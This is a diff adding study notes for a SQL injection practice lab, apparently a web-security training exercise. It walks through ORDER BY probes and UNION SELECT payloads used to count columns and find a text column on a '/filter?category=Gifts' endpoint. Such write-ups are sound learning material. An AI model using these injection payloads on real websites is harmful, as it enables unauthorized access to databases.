@@ -262,3 +262,40 @@ Payload 4 (second strategy):
 Number of columns = 3
 
 > Go to 'sqli-lab-03.py'
+
+# Lab 4. SQLi UNION attack. Find a Column Containing Text
+
+S1: Determine number of columns (`UNION SELECT NULL` 
+or `ORDER BY 3`).
+
+S2: Determine the data type of the columns.
+
+```sql
+-- Once you know there are 3 columns:
+SELECT a, b, c
+FROM tbl1
+    UNION
+SELECT 'a', NULL, NULL
+FROM DUAL
+-- Error => col1 is NOT of type VARCHAR/similar
+-- No error => col1 is of type VARCHAR/similar
+```
+
+`/filter?category=Gifts`
+
+Payload 1 = `' ORDER BY 1--`  
+Payload 2 = `' ORDER BY 2--`  
+Payload 3 = `' ORDER BY 3--`  
+Payload 4 = `' ORDER BY 4--` -> ERROR. Thus,
+the vulnerable table has 3 columns (1st column is usually
+not shown (ID)).
+
+Payload 5 = `' UNION select 'a', NULL, NULL--`  
+Payload 6 = `' UNION select NULL, 'a', NULL--` -> Works  
+Payload 7 = `' UNION select NULL, NULL, 'a'--`  
+
+Payload 8 = `' UNION select NULL, 'abcd', NULL--`  -> Works
+
+2nd column is of type "VARCHAR" or a similar STRING type.
+
+> Go to 'sqli-lab-04.py'
